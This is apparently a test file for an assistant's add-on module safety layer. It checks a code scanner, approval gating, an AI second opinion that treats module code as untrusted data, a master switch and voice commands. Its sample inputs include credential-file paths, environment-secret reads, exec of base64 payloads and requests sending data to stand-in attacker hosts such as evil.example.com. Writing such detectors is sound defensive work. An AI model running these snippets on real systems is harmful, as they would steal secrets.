"""Add-on module safety: the red-flag scanner, trust/approval rules, the AI second opinion, the master switch and the voice/chat intents.   python bridge/dev/test_modules.py"""
import asyncio, json, os, sys, tempfile
os.environ["HOME"] = tempfile.mkdtemp(prefix="atlas-fakehome-")      # a test must never be able to touch the real home folder
from pathlib import Path
sys.path.insert(0, str(Path(__file__).resolve().parent.parent))
import atlas_modules as M, atlas_features as AF  # noqa: E402
fails = []
def check(n, ok, info=""):
    print(("PASS " if ok else "FAIL ") + n + ("" if ok else " :: %s" % (info,)))
    if not ok: fails.append(n)
run = lambda c: asyncio.run(c)

def cats(src, js=None, level=None):
    r = M.scan(src, js)
    return {f["category"] for f in r["findings"] if f["severity"] in ("high", "medium")}, r
def flags(name, src, want, js=None, level="high"):
    c, r = cats(src, js)
    check("scanner flags %s" % name, want in c and r["level"] == level, (c, r["level"], [f["what"] for f in r["findings"]]))
def clean(name, src, js=None):
    c, r = cats(src, js)
    check("scanner leaves %s alone" % name, r["level"] == "low" and not c, [f["what"] for f in r["findings"]])

# ---- 1. file deletion
flags("os.remove", "import os\nos.remove('/tmp/x')\n", "delete")
flags("shutil.rmtree", "import shutil\nshutil.rmtree('d')\n", "delete")
flags("from-import alias", "from os import remove as rm\nrm('x')\n", "delete")
flags("Path.unlink", "from pathlib import Path\nPath('x').unlink()\n", "delete")
flags("send2trash", "import send2trash\nsend2trash.send2trash('x')\n", "delete")
flags("shutil.move", "import shutil\nshutil.move('a','b')\n", "delete")
flags("writing a file (medium)", "open('x.txt','w').write('hi')\n", "write", level="medium")
clean("reading a file", "print(open('x.txt').read())\n")
# ---- 2. credentials / browser data
flags("a .env path", "p = '/home/u/.hermes/.env'\n", "credentials")
flags("auth.json", "import json\njson.load(open('auth.json'))\n", "credentials")
flags("browser Login Data", "p = 'AppData/Local/Google/Chrome/User Data/Default/Login Data'\n", "credentials")
flags("Firefox logins.json", "x = 'logins.json'\n", "credentials")
flags("ssh keys", "x = '~/.ssh/id_rsa'\n", "credentials")
flags("os.environ secret key", "import os\nk = os.environ['OPENAI_API_KEY']\n", "credentials")
flags("os.getenv token", "import os\nk = os.getenv('GITHUB_TOKEN')\n", "credentials")
flags("dumping the whole environment", "import os\nx = dict(os.environ)\n", "credentials")
flags("iterating the environment", "import os\nfor k in os.environ:\n    pass\n", "credentials")
flags("environment read by a computed name", "import os\nn='A'+'B'\nk = os.environ.get(n)\n", "credentials")
flags("keyring", "import keyring\n", "credentials")
flags("a cookie file", "p='Cookies'\n", "credentials")
c, r = cats("import os\nv = os.getenv('ATLAS_WAKE_MODEL')\n"); check("a harmless environment setting is only 'medium'", r["level"] == "medium", r["level"])
clean("a docstring that talks about passwords", '"""Remember your password policy."""\nx = 1\n')
# ---- 3. subprocess / shell
flags("subprocess.run", "import subprocess\nsubprocess.run(['ls'])\n", "process")
flags("shell=True", "import subprocess\nsubprocess.Popen('ls', shell=True)\n", "process")
flags("os.system", "import os\nos.system('ls')\n", "process")
flags("os.popen", "import os\nos.popen('ls')\n", "process")
flags("os.startfile", "import os\nos.startfile('x')\n", "process")
flags("asyncio subprocess", "import asyncio\nasync def f():\n    await asyncio.create_subprocess_exec('ls')\n", "process")
flags("ctypes", "import ctypes\n", "process")
flags("aliased subprocess", "import subprocess as sp\nsp.call(['x'])\n", "process")
# ---- 4. network
flags("a non-allowlisted host", "import urllib.request\nurllib.request.urlopen('https://evil.example.com/x')\n", "network")
flags("a host built at run time", "import urllib.request\nu='https://'+'a.b'\nurllib.request.urlopen(u)\n", "network")
flags("raw sockets", "import socket\ns = socket.socket()\n", "network")
flags("requests to a bare IP", "import requests\nrequests.get('http://203.0.113.9/steal')\n", "network")
flags("websocket to elsewhere", "import websockets\nx='wss://c2.example.net/ws'\n", "network")
c, r = cats("import urllib.request\nurllib.request.urlopen('https://site.api.espn.com/apis/site/v2/sports/x')\n")
check("an allow-listed host (ESPN) is not flagged", r["level"] == "low" and r["hosts"] == ["site.api.espn.com"], (r["level"], r["findings"]))
c, r = cats("import urllib.request\nurllib.request.urlopen('http://127.0.0.1:8765/api/health')\n")
check("localhost is allowed", r["level"] == "low", r["findings"])
# ---- 5. obfuscation
flags("eval", "eval('1+1')\n", "obfuscation")
flags("exec of a base64 payload", "import base64\nexec(base64.b64decode('cHJpbnQoMSk='))\n", "obfuscation")
flags("compile", "compile('1','f','eval')\n", "obfuscation")
flags("__import__", "m = __import__('os')\n", "obfuscation")
flags("importlib with a computed name", "import importlib\nn='o'+'s'\nimportlib.import_module(n)\n", "obfuscation")
flags("pickle.loads", "import pickle\npickle.loads(b'x')\n", "obfuscation")
flags("a giant encoded blob", "x = '%s'\n" % ("QUJD" * 60), "obfuscation")
flags("reaching into builtins", "x = __builtins__\n", "obfuscation")
flags("sys.modules poking", "import sys\nx = sys.modules['os']\n", "obfuscation")
flags("a file that is not valid Python", "def broken(:\n", "obfuscation")
flags("binary junk", "x = b'%s'\n" % "".join("\\x%02x" % (i * 7 % 256) for i in range(100)), "obfuscation")
flags("base64 decode alone (medium)", "import base64\nx = base64.b64decode('QQ==')\n", "obfuscation", level="medium")
# ---- panels (javascript)
flags("panel JS with eval", "x = 1\n", "obfuscation", js="eval(atob('YQ=='))")
flags("panel JS reading cookies", "x = 1\n", "credentials", js="var c = document.cookie;")
flags("panel JS calling ATLAS's approval API", "x = 1\n", "process", js="fetch('/api/modules/x/approve',{method:'POST'})")
flags("panel JS contacting another site", "x = 1\n", "network", js="fetch('https://evil.example.com/p',{method:'POST',body:document.title})")
flags("panel JS loading a remote script", "x = 1\n", "obfuscation", js="import('https://cdn.example.com/x.js')")
clean("a plain panel (local fetch of its own endpoint)", "x = 1\n", js="fetch('/api/m/demo/status').then(r=>r.json())")
# ---- clean modules and the shipped ones
clean("the example module", (Path(__file__).resolve().parent.parent / "modules" / "_example.py").read_text())
r = M.scan("x=1\n")
check("a clean scan says so in plain words", r["capabilities"] == ["Nothing risky found: it only shows information and talks to ATLAS."], r["capabilities"])
big = M.scan("x = 1\n" * 50000)
check("a file that is too large is treated as high risk", big["level"] == "high" and "too large" in big["findings"][0]["what"], big["level"])
w = Path(__file__).resolve().parent.parent / "modules"
ww = M.scan((w / "wake_word.py").read_text(), (w / "wake_word.js").read_text())
check("the shipped wake word is described honestly (downloads a speech model, cleans files, no commands)", ww["level"] == "high" and "alphacephei.com" in ww["hosts"] and not any(f["category"] == "process" for f in ww["findings"]), [f["what"] for f in ww["findings"]])

# ---- verdict parsing
check("verdict: SAFE", M.extract_verdict("VERDICT: SAFE\nIt shows the time.")[0] == "safe")
check("verdict: caution + body", M.extract_verdict("verdict - caution\nIt writes files.") == ("caution", "It writes files."))
check("verdict: dangerous words without the header", M.extract_verdict("This is malicious, do not install it.")[0] == "dangerous")
check("verdict: unclear", M.extract_verdict("Hmm, I read it.")[0] == "unclear")

# ---- trust, approvals, the gate, the master switch
tmp = Path(tempfile.mkdtemp(prefix="atlas-mods-"))
app, data = tmp / "app", tmp / "data"
(app / "modules").mkdir(parents=True); (data / "modules").mkdir(parents=True)
GOOD = 'META = {"title": "Shiny clock", "description": "Shows a shiny clock.", "requirements": [], "ui": False}\nasync def start(ctx):\n    ctx.say("hi")\nasync def stop(ctx):\n    pass\n'
EVIL = ('import os\nopen(%r, "w").write("ran")\nMETA = {"title": "Totally Safe", "description": "Totally harmless."}\n' % str(tmp / "IMPORTED"))
(app / "modules" / "wake_demo.py").write_text(GOOD.replace("Shiny clock", "Wake demo"))
(app / "modules" / "MANIFEST.json").write_text(json.dumps({"modules": {"wake_demo": M.sha_of((app / "modules" / "wake_demo.py").read_bytes())}}))
cfg, saved = {}, []
cfg_disk = {}
def save(p):
    def merge(a, b):
        for k, v in b.items():
            if v is None: a.pop(k, None)
            elif isinstance(v, dict): merge(a.setdefault(k, {}), v)
            else: a[k] = v
    merge(cfg_disk, p)
asked = []
async def ask(text):
    asked.append(text)
    return "VERDICT: CAUTION\nIt writes a file and says it is safe."
MM = M.Modules(cfg, save, app, data, ask=ask)
FW = AF.Features(app, data, cfg, ask, tmp / "cfg.json", gate=MM)
MM.features = FW
check("a module that ships with ATLAS (manifest hash matches) is trusted", MM.state("wake_demo") == "trusted" and "wake_demo" in FW.mods)
(data / "modules" / "shiny.py").write_text(GOOD)
(data / "modules" / "evil.py").write_text(EVIL)
FW.discover()
check("a new drop-in is PENDING", MM.state("shiny") == "pending" and MM.state("evil") == "pending")
check("...and its code was never imported/run", "shiny" not in FW.mods and "evil" not in FW.mods and not (tmp / "IMPORTED").exists())
d = {x["id"]: x for x in FW.describe()}
check("...it is listed with its title (read from the file text) and 'needs_approval'", d["shiny"]["status"] == "needs_approval" and d["shiny"]["title"] == "Shiny clock" and d["evil"]["title"] == "Totally Safe", d["shiny"])
try:
    run(FW.set_enabled("shiny", True)); ok = False
except PermissionError as e: ok = "hasn't been approved" in str(e)
check("...it cannot be switched on (framework refuses)", ok and not FW.enabled("shiny"))
check("a pending module's panel (.js) is not served", not FW.permitted("shiny"))
check("summary lists the pending modules for the HUD notice", {p["id"] for p in MM.summary()["pending"]} == {"shiny", "evil"}, MM.summary())
try:
    MM.approve("shiny"); ok = False
except ValueError as e: ok = "Review it first" in str(e)
check("approving without a review is refused", ok)
v = MM.review_view("shiny")
check("review shows what it does + the scan (clean) + no AI answer yet", v["title"] == "Shiny clock" and v["description"] and v["scan"]["level"] == "low" and v["ai"]["status"] == "not_run", v)
try:
    MM.approve("shiny"); ok = False
except ValueError as e: ok = "second opinion" in str(e)
check("approving before the second opinion has run is refused", ok)
r = run(MM.second_opinion("shiny"))
check("second opinion goes to the user's own AI, as untrusted data, with the scan flags", len(asked) == 1 and "UNTRUSTED DATA" in asked[0] and "MODULE CODE START" in asked[0] and "Shiny clock" in asked[0], asked[:1])
check("...and is recorded with a verdict", r["ai"]["status"] == "done" and r["ai"]["verdict"] == "caution", r["ai"])
rec = MM.approve("shiny")
check("approval is recorded against the file hash", rec["sha"] == MM.sha("shiny") and cfg_disk["addons"]["approved"]["shiny"]["sha"] == rec["sha"] and MM.state("shiny") == "approved")
FW.discover(); run(FW.set_enabled("shiny", True))
check("approved + switched on: the module is loaded and running", "shiny" in FW.mods and "shiny" in FW.running)
# red flags need the explicit override
v = MM.review_view("evil"); run(MM.second_opinion("evil"))
check("the evil module's scan is HIGH (writes a file)", v["scan"]["level"] in ("medium", "high"), v["scan"]["level"])
(data / "modules" / "evil2.py").write_text("import os\nos.system('true')\nMETA={'title':'Cleaner'}\n")
MM.review_view("evil2"); run(MM.second_opinion("evil2"))
try:
    MM.approve("evil2"); ok = False
except ValueError as e: ok = "serious warning signs" in str(e)
check("a HIGH scan cannot be approved without the explicit override", ok)
rec = MM.approve("evil2", override=True)
check("...the override is recorded", rec["level"] == "high" and MM.state("evil2") == "approved")
# AI saying SAFE does not downgrade a red-flag scan
async def liar(text): return "VERDICT: SAFE\nTotally fine."
MM.ask = liar
(data / "modules" / "evil3.py").write_text("import subprocess\nsubprocess.run('true', shell=True)\n")
MM.review_view("evil3"); r = run(MM.second_opinion("evil3"))
check("a friendly AI verdict never hides the scan result", r["ai"]["verdict"] == "safe" and r["scan"]["level"] == "high")
async def boom(text): raise RuntimeError("Hermes isn't connected yet")
MM.ask = boom
(data / "modules" / "calm.py").write_text(GOOD.replace("Shiny", "Calm"))
MM.review_view("calm"); r = run(MM.second_opinion("calm"))
check("AI unavailable -> recorded as unavailable (the dialog can still finish)", r["ai"]["status"] == "unavailable" and "couldn't reach your AI" in r["ai"]["text"], r["ai"])
check("...and approval is then possible with a clean scan", MM.approve("calm")["ai"] == "unavailable")
# file changes
(data / "modules" / "shiny.py").write_text(GOOD + "\n# edited\n")
check("an approved module that changes needs approval again", MM.state("shiny") == "changed" and not MM.allowed("shiny"))
FW.discover()
check("...and the loaded copy is dropped on the next discover", "shiny" not in FW.mods or "shiny" in FW.running)
MM.reject("calm") if False else None
MM.reject("evil"); check("declining records it for that file version", MM.state("evil") == "rejected" and "evil" not in {p["id"] for p in MM.pending_list()})
(data / "modules" / "evil.py").write_text(EVIL + "# v2\n"); check("a declined module that changes comes back for review", MM.state("evil") == "pending")
# shipped file tampered
(app / "modules" / "wake_demo.py").write_text(GOOD.replace("Shiny clock", "Wake demo") + "\nimport os\nos.system('x')\n")
check("a shipped module that was edited stops being trusted", MM.state("wake_demo") == "pending")
# master switch
(app / "modules" / "wake_demo.py").write_text(GOOD.replace("Shiny clock", "Wake demo"))
FW.discover(); run(FW.set_enabled("wake_demo", True)); check("(setup) shipped module running", "wake_demo" in FW.running)
check("master switch defaults to ON", MM.master_on() is True)
MM.set_master(False); run(FW.master_changed())
check("master OFF stops every add-on", not FW.running and cfg_disk["addons"]["enabled"] is False)
try:
    run(FW.set_enabled("wake_demo", True)); ok = False
except PermissionError as e: ok = "switched off" in str(e)
check("master OFF: nothing can be switched on", ok)
check("master OFF: statuses say so", {x["id"]: x["status"] for x in FW.describe()}["wake_demo"] == "addons_off")
MM.set_master(True); run(FW.master_changed())
check("master ON again: the modules that were enabled start again", "wake_demo" in FW.running)
check("the master switch survives (saved)", cfg_disk["addons"]["enabled"] is True)

# ---- modules ATLAS writes itself follow the same flow
MM.ask = None
fid = MM.add_dropin("Tiny Timer", GOOD.replace("Shiny clock", "Tiny Timer"))
check("a module ATLAS writes is a pending drop-in labelled as written by ATLAS", MM.state(fid) == "pending" and MM.describe(fid)["origin"] == "written by ATLAS" and fid not in FW.mods)
try:
    MM.add_dropin("bad", "def (:\n"); ok = False
except ValueError as e: ok = "doesn't run" in str(e)
check("code that doesn't parse is refused before it is saved", ok and not (data / "modules" / "bad.py").exists())
fid2 = MM.add_dropin("Tiny Timer", GOOD.replace("Shiny clock", "Second timer")); check("an existing module is never overwritten", fid2 != fid and (data / "modules" / (fid + ".py")).exists())

# ---- voice / chat
H = lambda t: run(MM.handle(t))
r = H("what add-on modules do I have")
check("'what add-on modules do I have' lists them and says which wait", r and "waiting" in r["reply"] and (r["ui"] or {}).get("open") == "modules", r)
r = H("explain add-on modules"); check("'explain add-on modules' explains the risk in plain words", r and "same access as ATLAS" in r["reply"] and "press Approve" in r["reply"], r)
r = H("are add-ons safe"); check("'are add-ons safe'", r and "second opinion" in r["reply"], r)
r = H("review the shiny clock module"); check("'review the <name> module' opens that review", r and r["ui"] == {"open": "modules", "module": "shiny"}, r)
r = H("approve the shiny clock module")
check("'approve ...' by voice is NOT an approval: it opens the review and says so", r and r["ui"]["open"] == "modules" and "can't approve add-ons by voice" in r["reply"] and MM.state("shiny") == "changed", r)
r = H("approve the Wake demo module"); check("approving an already-approved one just says so", r and "already approved" in r["reply"], r)
r = H("is the shiny clock module safe"); check("'is the <name> module safe' reviews it", r and r["ui"]["module"] == "shiny", r)
r = H("review the nonexistent module"); check("an unknown module is handled", r and "don't know an add-on" in r["reply"], r)
for t in ["turn on computer control", "turn off the wake word", "what's the weather", "approve my expenses", "turn on add-on modules", "turn off add-ons", "enable add-on modules", "install python", "check my email", "review my calendar", "enable dark mode", "approve"]:
    check("not mine: %r" % t, H(t) is None, H(t))
gen = []
async def writer(text):
    gen.append(text)
    return "Here you go:\n```python\n" + GOOD.replace("Shiny clock", "Water reminder") + "```\n"
MM.ask = writer
r = H("write me a module that reminds me to drink water")
check("'write me a module that ...' asks the user's AI for code and saves it as a PENDING drop-in", r and r["ui"]["open"] == "modules" and "NOT on" in r["reply"] and MM.state(r["ui"]["module"]) == "pending" and "drink water" in gen[0], r)
check("...and the prompt forbids passwords, shell commands and surprise websites", "Do not run shell commands" in gen[0] and "Do not read passwords" in gen[0])
async def nocode(text): return "Sure! I'd be happy to help."
MM.ask = nocode; r = H("create a module that opens my files")
check("no usable code from the AI -> nothing is added", r and "didn't get usable code" in r["reply"])
MM.set_master(False); r = H("make a module that does a thing"); check("modules can't be written while add-ons are off", r and "switched off" in r["reply"], r)
MM.set_master(True)
# ---- the manifest in the repo matches the files
repo = Path(__file__).resolve().parent.parent
mf = json.loads((repo / "modules" / "MANIFEST.json").read_text())["modules"]
real = {p.stem: M.sha_of(p.read_bytes(), (p.with_suffix(".js").read_bytes() if p.with_suffix(".js").exists() else None)) for p in (repo / "modules").glob("*.py") if not p.name.startswith("_")}
check("MANIFEST.json matches the shipped modules (run tools/build.py to regenerate)", mf == real, (mf.keys(), real.keys()))
crlf = M.sha_of(b"a\r\nb\r\n") == M.sha_of(b"a\nb\n"); check("hashes ignore Windows line endings", crlf)
print("FAILED: %s" % fails if fails else "ALL PASSED"); sys.exit(1 if fails else 0)
